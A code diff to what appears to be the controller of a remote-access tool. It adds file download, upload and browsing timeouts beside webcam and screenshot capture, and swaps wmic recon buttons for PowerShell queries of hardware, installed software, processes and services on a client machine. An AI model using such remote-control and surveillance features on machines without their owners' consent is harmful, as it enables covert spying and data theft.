@@ -77,6 +77,9 @@ def execute_command(cmd, cmd_name):
         elif cmd.upper().startswith(("READ_TEXT_FILE:", "WRITE_TEXT_FILE:")):
             max_timeout = 25.0
             max_chunks = 1000
+        elif cmd.upper().startswith(("DOWNLOAD:", "UPLOAD:", "FILE_BROWSER:")):
+            max_timeout = 30.0
+            max_chunks = 10000
         else:
             max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
             if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
@@ -388,12 +391,12 @@ def update_commands_for_client_os(client_os):
 
         section("💻  SYSTEM & HARDWARE", "#1B5E20")
         btn("Full System Info",           "systeminfo",                   "💻", "#388E3C")
-        btn("CPU & RAM Info",             "wmic cpu get name && wmic memorychip get capacity", "⚙️", "#558B2F")
-        btn("Installed Programs",         "wmic product get name,version", "📦", "#F57F17")
+        btn("CPU & RAM Info",             r'''powershell -Command "Get-CimInstance Win32_Processor | Select-Object Name; Get-CimInstance Win32_PhysicalMemory | Select-Object Capacity"''', "⚙️", "#558B2F")
+        btn("Installed Programs",         r'''powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table"''', "📦", "#F57F17")
 
         section("🎯  PROCESS & SERVICES", "#4A148C")
-        btn("Top Memory Usage",           "wmic process get name,workingsetsize | sort", "📈", "#8E24AA")
-        btn("Running Services",           "sc query type= all state= running",           "⚙️", "#00838F")
+        btn("Top Memory Usage",           r'''powershell -Command "Get-Process | Sort-Object WorkingSet -Descending | Select-Object Name, Id, @{Name='WorkingSet(MB)';Expression={$_.WorkingSet/1MB}} -First 15"''', "📈", "#8E24AA")
+        btn("Running Services",           "sc query type= all state= active",           "⚙️", "#00838F")
         btn("Scheduled Tasks",            "schtasks /query /fo LIST",           "📅", "#F57C00")
 
     # ─────────────────────────── LINUX / MAC ──────────────────────────────────
